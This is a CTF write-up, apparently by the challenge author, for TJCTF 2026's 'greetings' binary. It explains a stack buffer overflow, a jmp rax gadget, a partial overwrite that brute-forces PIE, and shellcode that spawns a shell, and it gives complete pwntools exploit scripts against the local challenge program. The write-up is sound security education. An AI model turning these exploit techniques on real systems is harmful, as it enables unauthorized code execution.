---
author: milrn
categories:
- CTF Writeups
- Binary Exploitation
- Easy
layout: post
media_subpath: /assets/posts/2026-05-26-greetings
tags:
- TJCTF 2026
- Buffer Overflow
- Shellcode
- Easy
title: greetings
description: greetings was a Easy Binary Exploitation challenge from TJCTF 2026. This is the author solution for the challenge.
---

greetings was a Easy Binary Exploitation challenge from TJCTF 2026. This is the intended solution for the challenge, by the author (me).

# Analysis

```
┌──(kali㉿kali)-[~/Downloads/greetings/bin]
└─$ checksec --file=greetings
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX disabled   PIE enabled     No RPATH   No RUNPATH   41 Symbols        No    0               2               greetings
```

There is no NX on this binary, which means shellcode is allowed, but there is PIE.

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void greetUser() {
        int uname_size;
        char uname[64];
        printf("Enter the size of your username: ");
        scanf("%d", &uname_size);
        getchar();
        uname_size += 2;
        printf("Enter username (start with @): ");
        fgets(uname, uname_size, stdin);
        if (*(char *) uname == '@') {
                printf("Greetings to you: %s!", uname);
        }
}

int main() {
        setbuf(stdout, NULL);
        greetUser();
        return 0;
}
```

The greetings.c file is very small with a clear buffer overflow in uname. uname_size can be set to any value, and then that many bytes (plus 2) are used as the fgets read size into a 64-byte stack buffer.

Before going any further, the amount of bytes to write to overflow the saved RIP can be calculated as follows:

```
gef greetings
pattern create 500
run
<Enter Pattern As Username>
```

```
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdd48│+0x0000: "jaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapa[...]"    ← $rsp
0x00007fffffffdd50│+0x0008: "kaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqa[...]"
0x00007fffffffdd58│+0x0010: "laaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaara[...]"
0x00007fffffffdd60│+0x0018: "maaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasa[...]"
0x00007fffffffdd68│+0x0020: "naaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaata[...]"
0x00007fffffffdd70│+0x0028: "oaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaaua[...]"
0x00007fffffffdd78│+0x0030: "paaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaava[...]"
0x00007fffffffdd80│+0x0038: "qaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawa[...]"
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x5555555551df <greetUser+005f> je     0x5555555551f0 <greetUser+112>
   0x5555555551e1 <greetUser+0061> add    rsp, 0x50
   0x5555555551e5 <greetUser+0065> pop    rbx
 → 0x5555555551e6 <greetUser+0066> ret    
[!] Cannot disassemble from $PC
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "greetings", stopped 0x5555555551e6 in greetUser (), reason: SIGSEGV
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x5555555551e6 → greetUser()
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  pattern offset $rsp
[+] Searching for '6a61616161616161'/'616161616161616a' with period=8
[+] Found at offset 72 (little-endian search) likely
```

So, the saved RIP overwrite starts at 72 bytes.

However, it's not possible to stash shellcode in uname and then directly set the saved RIP to uname because there are no stack leaks.

# rax

The solution to this unknown address problem is to use a gadget that jumps to a register that already points to our shellcode.

```
┌──(kali㉿kali)-[~/Downloads/greetings/bin]
└─$ ROPgadget --binary=greetings | grep -e "jmp" -e "call"
0x0000000000001057 : add al, byte ptr [rax] ; add byte ptr [rax], al ; jmp 0x1020
0x000000000000116b : add byte ptr [rax], 0 ; add byte ptr [rax], al ; endbr64 ; jmp 0x10f0
0x000000000000116c : add byte ptr [rax], al ; add byte ptr [rax], al ; endbr64 ; jmp 0x10f0
0x0000000000001037 : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x1020
0x000000000000116e : add byte ptr [rax], al ; endbr64 ; jmp 0x10f0
0x0000000000001039 : add byte ptr [rax], al ; jmp 0x1020
0x0000000000001034 : add byte ptr [rax], al ; push 0 ; jmp 0x1020
0x0000000000001044 : add byte ptr [rax], al ; push 1 ; jmp 0x1020
0x0000000000001054 : add byte ptr [rax], al ; push 2 ; jmp 0x1020
0x0000000000001064 : add byte ptr [rax], al ; push 3 ; jmp 0x1020
0x0000000000001009 : add byte ptr [rax], al ; test rax, rax ; je 0x1012 ; call rax
0x00000000000010d8 : add byte ptr [rax], al ; test rax, rax ; je 0x10e8 ; jmp rax
0x0000000000001119 : add byte ptr [rax], al ; test rax, rax ; je 0x1128 ; jmp rax
0x00000000000010d7 : add byte ptr cs:[rax], al ; test rax, rax ; je 0x10e8 ; jmp rax
0x0000000000001118 : add byte ptr cs:[rax], al ; test rax, rax ; je 0x1128 ; jmp rax
0x0000000000001047 : add dword ptr [rax], eax ; add byte ptr [rax], al ; jmp 0x1020
0x0000000000001067 : add eax, dword ptr [rax] ; add byte ptr [rax], al ; jmp 0x1020
0x0000000000001010 : call rax
0x0000000000001173 : cli ; jmp 0x10f0
0x0000000000001170 : endbr64 ; jmp 0x10f0
0x000000000000100e : je 0x1012 ; call rax
0x00000000000010dd : je 0x10e8 ; jmp rax
0x000000000000111e : je 0x1128 ; jmp rax
0x000000000000103b : jmp 0x1020
0x0000000000001174 : jmp 0x10f0
0x00000000000010df : jmp rax
0x0000000000001062 : mov dl, 0x2f ; add byte ptr [rax], al ; push 3 ; jmp 0x1020
0x0000000000001117 : mov ebp, 0x4800002e ; test eax, eax ; je 0x1128 ; jmp rax
0x0000000000001052 : mov edx, 0x6800002f ; add al, byte ptr [rax] ; add byte ptr [rax], al ; jmp 0x1020
0x00000000000010d6 : out dx, al ; add byte ptr cs:[rax], al ; test rax, rax ; je 0x10e8 ; jmp rax
0x0000000000001036 : push 0 ; jmp 0x1020
0x0000000000001046 : push 1 ; jmp 0x1020
0x0000000000001056 : push 2 ; jmp 0x1020
0x0000000000001066 : push 3 ; jmp 0x1020
0x000000000000100c : test eax, eax ; je 0x1012 ; call rax
0x00000000000010db : test eax, eax ; je 0x10e8 ; jmp rax
0x000000000000111c : test eax, eax ; je 0x1128 ; jmp rax
0x000000000000100b : test rax, rax ; je 0x1012 ; call rax
0x00000000000010da : test rax, rax ; je 0x10e8 ; jmp rax
0x000000000000111b : test rax, rax ; je 0x1128 ; jmp rax
```

We have a few interesting gadgets here including `call rax` and `jmp rax`. rax is a special register because it holds function return values. At the end of the greetUser() function, fgets is called (which returns the destination pointer), so after fgets(uname, ...), rax holds &uname. As long as the username does not start with @, the printf("Greetings to you...") branch is skipped, so no extra call clobbers rax before returning. Then at function return, if RIP is redirected to jmp rax, for example, execution goes straight into shellcode in uname.

# Bypassing PIE

However, there is one more major issue before we can call the gadget: PIE. The binary base is randomized every run, so jmp rax is not at a fixed absolute address (only the 3 least significant nibbles are the same before and after PIE). The good part is a full RIP overwrite is not needed here. The normal return address is BASE + 0x1089, and the gadget we want is BASE + 0x10df, so most high bytes are already correct and only the least significant byte needs to change. Although, since fgets always needs a null terminator at the end, it's impossible to only fully control the least significant byte without overwriting the second least significant byte with \x00. In this case that's perfectly fine though because the third least significant nibble is a 0, which is fixed, and the fourth least significant nibble is a guess (randomized by PIE), which means 0 is also fine! This gives a 1/16 chance of overwriting the saved RIP with the correct gadget successfully. To achieve this, 72 bytes should be requested from the program as it will actually give a 74 byte write (with the +2). After the 72 bytes of padding are added, the 73rd byte should just be the fixed `0xdf`, and the 74th byte will be automatically overwritten with a null byte. Lastly, running this exploit multiple times will be needed because of the 1/16 chance.

So far, the following PoC can be assembled:

```
from pwn import *
elf = ELF('./greetings')
context.arch = 'amd64'
shellcode = b"" # we'll get to this next!
for i in range(1000):
    p = process(elf.path)
    p.sendline(str(72).encode())
    payload = shellcode + b'A' * (72 - len(shellcode))
    payload += p8(0xdf)
    p.sendline(payload)
    p.sendline(b'echo pwned')
    try:
        response = p.recvuntil(b'pwned\n')
    except:
        response = b''
    if b'pwned' in response:
        p.interactive()
        break
```

# Shellcode

Shellcode in uname has been constantly referenced throughout this writeup, but the basic payload: shellcraft.amd64.sh(), by itself won't actually work even when executed by jmp/call rax.

This is because shellcraft.amd64.sh() uses a lot of "push" instructions and builds both the path string and argv pointers on the stack.

Disassembly:

```
push 0x68
mov rax, 0x732f2f2f6e69622f
push rax
mov rdi, rsp
push 0x1016972
xor dword ptr [rsp], 0x1010101
xor esi, esi
push rsi
push 8
pop rsi
add rsi, rsp
push rsi
mov rsi, rsp
xor edx, edx
push 0x3b
pop rax
syscall
```

On x86_64 each push writes 8 bytes and moves rsp down by 8. In this overflow layout, the end of the shellcode is just slightly below RSP (which was moved up by the epilogue and is now only seperated by 'A' padding), so those pushes can write over the shellcode bytes that have not executed
yet and corrupt them. That is why it is necessary to add a `sub rsp, 100` instruction before the sh() shellcode to move rsp below the shellcode and avoid any corruption.

# Final Exploit

```
from pwn import *
elf = ELF('./greetings')
context.arch = 'amd64'
shellcode = asm("sub rsp, 100") + asm(pwnlib.shellcraft.amd64.sh())
for i in range(1000):
    p = process(elf.path)
    p.sendline(b"72")
    payload = shellcode + b'A' * (72 - len(shellcode))
    payload += p8(0xdf)
    p.sendline(payload)
    p.sendline(b'echo pwned')
    try:
        response = p.recvuntil(b'pwned\n')
    except:
        response = b''
    if b'pwned' in response:
        p.interactive()
        break
```

# Conclusion

There was also a way to use pwnlib.shellcraft.amd64.cat which worked without moving rsp around at all, but gaining a full shell is always good practice. Overall, I hope this challenge was fun for everyone!
